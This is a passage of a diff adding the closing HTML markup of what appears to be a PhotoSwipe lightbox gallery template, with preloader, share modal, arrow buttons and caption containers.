+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
